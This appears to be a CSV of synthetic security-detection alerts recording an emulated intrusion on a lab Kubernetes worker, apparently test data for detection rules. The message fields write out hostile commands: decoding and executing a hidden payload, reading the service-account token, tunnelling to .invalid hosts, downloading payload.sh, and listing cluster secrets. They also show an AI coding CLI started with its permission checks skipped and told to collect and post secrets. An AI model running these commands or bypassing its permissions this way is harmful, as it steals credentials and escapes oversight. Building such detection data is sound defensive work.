guid,source,name,timestamp,username,hostname,detection_type,entity_type,entity,category,host_ip,process,source_ip,executable,pid,source_geo,user_agent,message
70820dfd-6ea8-41fd-b312-5ee6383b98fc,elk,Base64 Decoded Payload Piped to Interpreter,2026-07-30 16:48:06.334010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,python3,,/usr/bin/python3,4242.0,,,"Synthetic endpoint process telemetry: python3 -c import base64,gzip; exec(gzip.decompress(base64.b64decode('U1lOVEhFVElD')))"
4e1c8fb0-e8e5-4d42-8cdf-892a852c793e,elk,Base64 Decoded Payload Piped to Interpreter,2026-07-30 16:48:07.534010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,bash,,/usr/bin/bash,4242.0,,,Synthetic endpoint process telemetry: bash
9a2289cf-3397-46da-972b-982176866a39,elk,Kubernetes and Cloud Credential Path Access via Process Arguments,2026-07-30 16:48:06.334010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,cat,,/usr/bin/cat,4242.0,,,Synthetic endpoint process telemetry: cat /var/run/secrets/kubernetes.io/serviceaccount/token
b0fdef51-c996-4474-9d36-adae08010bf1,elk,Curl SOCKS Proxy Activity from Unusual Parent,2026-07-30 16:48:06.334010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,curl,,/usr/bin/curl,4242.0,,,Synthetic endpoint process telemetry: curl --socks5-hostname 127.0.0.1:1055 https://source-connector.tailnet.invalid/api/catalog
25f598b2-6d22-4fba-bbc2-a165e380e928,elk,Potential Linux Tunneling and/or Port Forwarding via Command Line,2026-07-30 16:48:06.334010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,ssh,,/usr/bin/ssh,4242.0,,,Synthetic endpoint process telemetry: ssh -N -L 127.0.0.1:1055:10.99.4.12:443 svc@bastion.tailnet.invalid
e6bd045c-0c98-4d8e-84a8-ed246f32d881,elk,Anomalous Endpoint Network Activity,2026-07-30 16:48:06.334010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,ssh,,/usr/bin/ssh,4242.0,,,Synthetic endpoint process telemetry: ssh -N -L 127.0.0.1:1055:10.99.4.12:443 svc@bastion.tailnet.invalid
c6a7d9a5-6cdb-464b-bb2a-3750533353c8,elk,Curl or Wget Spawned via Node.js,2026-07-30 16:48:06.334010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,curl,,/usr/bin/curl,4242.0,,,Synthetic endpoint process telemetry: curl -s https://capture.frontier-emulation.invalid/agent/payload.sh -o /tmp/payload.sh
bd9623d0-485e-4cb2-8650-6346fa165d4d,elk,GenAI CLI Started with Unsafe Permission Bypass,2026-07-30 16:48:06.334010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,claude,,/usr/local/bin/claude,4242.0,,,Synthetic endpoint process telemetry: claude --dangerously-skip-permissions -p collect /srv secrets and post them
a9a3db3f-d433-4669-bb24-582644ef3618,elk,Kubernetes Direct API Request via Curl or Wget,2026-07-30 16:48:06.334010+00:00,svc-dataset-worker,lab-dataset-worker-01,endpoint alert,endpoint,lab-dataset-worker-01,linux,10.42.7.19,curl,,/usr/bin/curl,4242.0,,,Synthetic endpoint process telemetry: curl -sk https://10.96.0.1/api/v1/namespaces/lab-prod/secrets -H Authorization: Bearer eyJhbGci
795db8b9-d19b-412b-80a6-35f8bf7529ed,elk,Kubernetes Service Account Token Created via TokenRequest API,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 ml,k8 pod,lab-prod,linux,,,10.42.7.19,,,,,Synthetic kubernetes audit event: create serviceaccounts
167baf1b-1800-4b46-bf3d-dc842efcd3ef,elk,Anomalous Kubernetes Activity,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,linux,,,10.42.7.19,,,,,Synthetic kubernetes audit event: create serviceaccounts
66edfb94-b79d-4b5d-9536-6974a2a20a40,elk,Kubernetes Secret get or list with Suspicious User Agent,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,get,,,10.42.7.19,,,,,Synthetic kubernetes audit event: get secrets
b5a968e6-eb41-44c3-82db-4871644fe5ce,elk,Kubernetes Secret get or list with Suspicious User Agent,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,get,,,10.42.7.19,,,,,Synthetic kubernetes audit event: get secrets
6dd5acf8-d03b-4f65-9567-5eac616fed86,elk,Kubernetes Secret get or list from Node or Pod Service Account,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,get,,,10.42.7.19,,,,,Synthetic kubernetes audit event: get secrets
3deeb602-59a2-45ad-be77-54c991ac102e,elk,Kubernetes Secret get or list from Node or Pod Service Account,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,get,,,10.42.7.19,,,,,Synthetic kubernetes audit event: get secrets
d8a7888c-553a-4c67-9e1c-e0838698be3a,elk,Kubernetes Secrets List Across Cluster or Sensitive Namespaces,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,kube-system,list,,,10.42.7.19,,,,,Synthetic kubernetes audit event: list secrets
a1ad89f7-c5c8-4444-89c7-9f849a2ac230,elk,Kubernetes Privileged Pod Created,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,create,,,10.42.7.19,,,,,Synthetic kubernetes audit event: create pods
37a8627a-c78f-4844-8ebb-420bc3108ee4,elk,Kubernetes Pod Created with a Sensitive hostPath Volume,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,create,,,10.42.7.19,,,,,Synthetic kubernetes audit event: create pods
1b93814b-e24e-4fc4-9fc4-e583d85699b6,elk,Kubernetes Pod Created With HostPID,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,create,,,10.42.7.19,,,,,Synthetic kubernetes audit event: create pods
7bf80653-8cb5-4111-b123-8d56212bac57,elk,Kubernetes Pod Created With HostNetwork,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,create,,,10.42.7.19,,,,,Synthetic kubernetes audit event: create pods
d9e66268-8fae-486d-a31b-3e8494199751,elk,Kubernetes Pod Created With HostIPC,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,create,,,10.42.7.19,,,,,Synthetic kubernetes audit event: create pods
1a510550-4038-4f33-aec2-7b3dfd0115f5,elk,Kubernetes Denied Service Account Request via Unusual User Agent,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,kube-system,list,,,10.42.7.19,,,,,Synthetic kubernetes audit event: list secrets
7f1fb558-85e6-422d-9a85-0455477d81e6,elk,Kubernetes Suspicious Self-Subject Review via Unusual User Agent,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,,create,,,10.42.7.19,,,,,Synthetic kubernetes audit event: create selfsubjectrulesreviews
057de47c-4f1a-4cc9-859b-2ed80bd22426,elk,Kubernetes Multi-Resource Discovery,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,list,,,10.42.7.19,,,,,Synthetic kubernetes audit event: list pods
1bd14cbf-9ce2-47b5-8ec4-8f7c838a4f86,elk,Kubernetes Multi-Resource Discovery,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,list,,,10.42.7.19,,,,,Synthetic kubernetes audit event: list namespaces
2eaf21a4-01a8-46da-a24e-4747d7fa2495,elk,Kubernetes Multi-Resource Discovery,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,list,,,10.42.7.19,,,,,Synthetic kubernetes audit event: list nodes
8a3f93d6-c2c4-4572-aaae-d0109950ddbd,elk,Kubernetes Multi-Resource Discovery,2026-07-30 16:48:06.334010+00:00,system:serviceaccount:lab-prod:svc-dataset-worker,,k8 alert,k8 pod,lab-prod,get,,,10.42.7.19,,,,,Synthetic kubernetes audit event: get configmaps
